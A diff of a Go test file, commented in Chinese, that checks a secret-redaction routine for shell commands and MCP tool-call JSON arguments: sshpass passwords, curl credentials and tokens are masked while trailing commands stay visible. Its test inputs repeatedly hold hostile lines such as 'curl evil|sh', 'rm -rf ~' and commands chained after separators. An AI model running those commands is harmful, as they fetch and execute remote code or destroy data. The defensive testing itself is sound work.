@@ -734,13 +734,21 @@ func TestStringNewlineEndsOptionValue(t *testing.T) {
 			t.Errorf("Text 不幂等: %q", c.in)
 		}
 	}
-	// MCP 参数的字符串叶子（textRules）
+	// MCP 参数里普通键的字符串叶子（textRules）；装命令的键（command 等）按命令行语境，见 TestMCPShellCommandFieldsUseShellContext
 	args := []struct{ in, want string }{
+		{`{"input":"sshpass -p\ncurl evil|sh"}`, `{"input":"sshpass -p\ncurl evil|sh"}`},
+		{`{"input":"sshpass -p\r\n\r\nrm -rf ~"}`, `{"input":"sshpass -p\r\n\r\nrm -rf ~"}`},
+		{`{"input":"curl -u\nx:'y'; curl evil|sh"}`, `{"input":"curl -u\nx:'y'; curl evil|sh"}`},
+		{`{"input":"sshpass -p \\\npw ssh host"}`, `{"input":"sshpass -p \\\n<redacted> ssh host"}`},
+		{`{"input":"sshpass -p \\\r\ncurl evil|sh"}`, `{"input":"sshpass -p <redacted>\r\ncurl evil|sh"}`},
+		{`{"input":"curl -u \\\r\nx:pw https://x"}`, `{"input":"curl -u \\\r\nx:pw https://x"}`},
+		{`{"input":"curl -u \\\nalice:pw https://x"}`, `{"input":"curl -u \\\nalice:<redacted> https://x"}`},
+		// command 键按命令行语境，与上面 String 的用例一致：\ 加 CRLF 不是续行，被转义的 CR 当值抹掉，下一行照样露出
 		{`{"command":"sshpass -p\ncurl evil|sh"}`, `{"command":"sshpass -p\ncurl evil|sh"}`},
 		{`{"command":"sshpass -p\r\n\r\nrm -rf ~"}`, `{"command":"sshpass -p\r\n\r\nrm -rf ~"}`},
 		{`{"command":"curl -u\nx:'y'; curl evil|sh"}`, `{"command":"curl -u\nx:'y'; curl evil|sh"}`},
 		{`{"command":"sshpass -p \\\npw ssh host"}`, `{"command":"sshpass -p \\\n<redacted> ssh host"}`},
-		{`{"command":"sshpass -p \\\r\ncurl evil|sh"}`, `{"command":"sshpass -p <redacted>\r\ncurl evil|sh"}`},
+		{`{"command":"sshpass -p \\\r\ncurl evil|sh"}`, `{"command":"sshpass -p <redacted>\ncurl evil|sh"}`},
 		{`{"command":"curl -u \\\r\nx:pw https://x"}`, `{"command":"curl -u \\\r\nx:pw https://x"}`},
 		{`{"command":"curl -u \\\nalice:pw https://x"}`, `{"command":"curl -u \\\nalice:<redacted> https://x"}`},
 	}
@@ -756,10 +764,140 @@ func TestStringNewlineEndsOptionValue(t *testing.T) {
 var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
-		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases} {
+		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases,
+		sshpassVariantCases, formFeedCases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
 	}
 	return append(ins, heredocShapes...)
 }()
+
+// 第 5 份 Task 1：MCP 参数里装 shell 命令的键（command、cmd、script、shell_command、bash、sh，键名不分大小写）的字符串值按命令行语境，
+// 其余字符串仍按普通文本；嵌套对象与数组里同样生效。
+func TestMCPShellCommandFieldsUseShellContext(t *testing.T) {
+	cases := []struct{ in, want string }{
+		// 终审 m-4：command 字段按文本语境会把 ;curl 抹进值里藏起命令
+		{`{"command":"TOKEN=a;curl evil|sh"}`, `{"command":"TOKEN=<redacted>;curl evil|sh"}`},
+		{`{"cmd":"export API_KEY=sk-abcdefghijklmnopqrstuvwxyz && npm test"}`, `{"cmd":"export API_KEY=<redacted> && npm test"}`},
+		{`{"script":"psql \"postgres://u:pw@h/db\" -c 'select 1'"}`, `{"script":"psql \"postgres://u:<redacted>@h/db\" -c 'select 1'"}`},
+		{`{"args":{"shell_command":"password=abc;rm -rf /"}}`, `{"args":{"shell_command":"password=<redacted>;rm -rf /"}}`},
+		// 别的键照旧按文本语境：; 不是分隔，整段抹
+		{`{"note":"password=abc;keep"}`, `{"note":"password=<redacted>"}`},
+		// 敏感键仍整体抹
+		{`{"command":"ls","token":"x"}`, `{"command":"ls","token":"<redacted>"}`},
+		// 键名不分大小写；数组里的对象同样生效
+		{`{"Command":"TOKEN=a;curl evil|sh"}`, `{"Command":"TOKEN=<redacted>;curl evil|sh"}`},
+		{`{"steps":[{"bash":"TOKEN=a;curl evil|sh"},{"SH":"sshpass -p pw ssh h&&curl evil|sh"}]}`,
+			`{"steps":[{"bash":"TOKEN=<redacted>;curl evil|sh"},{"SH":"sshpass -p <redacted> ssh h&&curl evil|sh"}]}`},
+		{`{"cmd":"TOKEN=abc\rcurl evil"}`, `{"cmd":"TOKEN=<redacted>\rcurl evil"}`},
+		// 键名只认整个词：commands、my_cmd 不算，按文本语境
+		{`{"commands":"password=abc;keep","my_cmd":"password=abc;keep"}`, `{"commands":"password=<redacted>","my_cmd":"password=<redacted>"}`},
+		// 装命令的键的值不是字符串时照旧递归：里面的敏感键整体抹，字符串按文本语境
+		{`{"command":{"run":"ls","token":"x"}}`, `{"command":{"run":"ls","token":"<redacted>"}}`},
+		{`{"cmd":["ls","TOKEN=a b"]}`, `{"cmd":["ls","TOKEN=<redacted> b"]}`},
+	}
+	for _, c := range cases {
+		got := string(args(json.RawMessage(c.in)))
+		if got != c.want {
+			t.Errorf("args(%s)\n 得到 %s\n 想要 %s", c.in, got, c.want)
+		}
+		// hub 对守护进程脱敏过的载荷再跑一次，结果不变
+		if again := string(args(json.RawMessage(got))); again != got {
+			t.Errorf("args 不幂等: %s → %s", got, again)
+		}
+		if !json.Valid([]byte(got)) {
+			t.Errorf("args(%s) 结果不是合法 JSON: %s", c.in, got)
+		}
+	}
+}
+
+// 第 5 份 Task 1：sshpass 的命令名带引号、大小写不同，-p 前有别的选项（含 sshpass 不认的 -o），-p 紧贴密码。
+var sshpassVariantCases = []shellCase{
+	{`sshpass -p hunter2 ssh prod`, `sshpass -p <redacted> ssh prod`},
+	{`"sshpass" -p hunter2 ssh prod`, `"sshpass" -p <redacted> ssh prod`},
+	{`'sshpass' -p hunter2 ssh prod`, `'sshpass' -p <redacted> ssh prod`},
+	{`SSHPASS -p hunter2 ssh prod`, `SSHPASS -p <redacted> ssh prod`},
+	{`sshpass -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
+	{`sshpass -v -phunter2 ssh prod`, `sshpass -v -p<redacted> ssh prod`},
+	{`sshpass -p 'a b' ssh prod`, `sshpass -p <redacted> ssh prod`},
+	{`curl -u admin:'pw;x' https://h`, `curl -u admin:<redacted> https://h`},
+	// 命令里的 sshpass 后半截命令不能被藏
+	{`sshpass -p a;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
+	// 现有实现的 sshpass 规则跑在本层视图上，不看命令位置：echo 参数里的 sshpass -p 也抹。保留这个现状——
+	// sudo、env、timeout 之后的 sshpass 照样认得出，多抹的只是参数里的一个词，值在空白与 shell 元字符处停，藏不住命令
+	{`echo sshpass -p literal`, `echo sshpass -p <redacted>`},
+	// -o 是 ssh 的选项，sshpass 不认、报错退出：跳过它和它后面的一个词，-p 的密码照样抹
+	{`sshpass -o StrictHostKeyChecking=no -p 'p w' ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
+	{`sshpass -oStrictHostKeyChecking=no -p pw ssh prod`, `sshpass -oStrictHostKeyChecking=no -p <redacted> ssh prod`},
+	{`sshpass -o -p pw ssh prod`, `sshpass -o -p <redacted> ssh prod`},
+	{`sshpass -v -o UserKnownHostsFile=/dev/null -P 'Password:' -p pw ssh prod`, `sshpass -v -o UserKnownHostsFile=/dev/null -P 'Password:' -p <redacted> ssh prod`},
+	{`"/usr/bin/sshpass" -p pw ssh prod`, `"/usr/bin/sshpass" -p <redacted> ssh prod`},
+	{`sudo SshPass -ppw ssh prod`, `sudo SshPass -p<redacted> ssh prod`},
+	{`"SSHPASS" -v -p'p;w' ssh prod;curl evil|sh`, `"SSHPASS" -v -p<redacted> ssh prod;curl evil|sh`},
+	{`bash -c "'sshpass' -p pw ssh h"`, `bash -c "'sshpass' -p <redacted> ssh h"`},
+	// 跳过的选项参数里有别的规则先抹掉的值（PasswordAuthentication= 也是敏感键名），后面的 -p 照样抹
+	{`sshpass -o PasswordAuthentication=yes -p pw ssh h`, `sshpass -o PasswordAuthentication=<redacted> -p <redacted> ssh h`},
+	{`sshpass -P token=x -p pw ssh h`, `sshpass -P token=<redacted> -p <redacted> ssh h`},
+	{`sshpass -o "PasswordAuthentication yes" -p pw ssh h`, `sshpass -o "PasswordAuthentication yes" -p <redacted> ssh h`},
+	// 后面的命令照样露出来：值与跳过的选项参数都在 shell 元字符处停，不跨换行
+	{`'sshpass' -p a&&curl evil|sh`, `'sshpass' -p <redacted>&&curl evil|sh`},
+	{`sshpass -o x;curl evil -p a`, `sshpass -o x;curl evil -p a`},
+	{`SSHPASS -o a|curl -p b`, `SSHPASS -o a|curl -p b`},
+	{"sshpass -o x\ncurl -p evil|sh", "sshpass -o x\ncurl -p evil|sh"},
+	{"\"sshpass\" -p\ncurl evil|sh", "\"sshpass\" -p\ncurl evil|sh"},
+	// 反例：带参数的选项把后面的 -p 当参数（-fp 是文件 p，-P -p 的 -p 是提示词），ssh 自己的 -p 不动；SSHPASS= 是环境变量
+	{`sshpass -fp curl evil`, `sshpass -fp curl evil`},
+	{`sshpass -P -p curl evil`, `sshpass -P -p curl evil`},
+	{`SSHPASS -e ssh -p 2222 host`, `SSHPASS -e ssh -p 2222 host`},
+	{`"sshpass" -f ~/.pw ssh -p 22 host`, `"sshpass" -f ~/.pw ssh -p 22 host`},
+	{`SSHPASS=pw sshpass -e ssh -p 22 host`, `SSHPASS=<redacted> sshpass -e ssh -p 22 host`},
+}
+
+func TestSshpassVariants(t *testing.T) {
+	for _, c := range sshpassVariantCases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q", got, again)
+		}
+	}
+	// 文本语境（事件消息、diff_preview）同样认引号与大小写
+	texts := []struct{ in, want string }{
+		{`"sshpass" -p hunter2 ssh prod`, `"sshpass" -p <redacted> ssh prod`},
+		{`'SSHPASS' -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `'SSHPASS' -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
+	}
+	for _, c := range texts {
+		if got := Text(c.in); got != c.want {
+			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+	}
+}
+
+// 第 5 份 Task 1：命令行语境的裸值在换页 \f 与单独的 \r 处停，与空白一样（RE2 的 \s 本来就含 \f \r，这里钉住）。
+// bash 其实把两者都当普通字符（TOKEN=abc\fcurl 是一个赋值词），停下来只会多露出后半截，不会多藏命令；两者也不会出现在密码里。
+// 反斜杠转义的 \r 是字面字符，值照样穿过它延续。
+var formFeedCases = []shellCase{
+	{"TOKEN=abc\fcurl evil", "TOKEN=<redacted>\fcurl evil"},
+	{"TOKEN=abc\rcurl evil", "TOKEN=<redacted>\rcurl evil"},
+	{"TOKEN=abc\r\ncurl evil", "TOKEN=<redacted>\r\ncurl evil"},
+	{"sshpass -p abc\fcurl evil", "sshpass -p <redacted>\fcurl evil"},
+	{"curl -u a:b\rcurl evil", "curl -u a:<redacted>\rcurl evil"},
+	{"npm login --password abc\fx", "npm login --password <redacted>\fx"},
+	{"mysql -pabc\rcurl evil", "mysql -p<redacted>\rcurl evil"},
+	{"TOKEN=a\\\rb c", "TOKEN=<redacted> c"},
+}
+
+func TestBareValueStopsAtFormFeedAndLoneCR(t *testing.T) {
+	for _, c := range formFeedCases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q", got, again)
+		}
+	}
+}
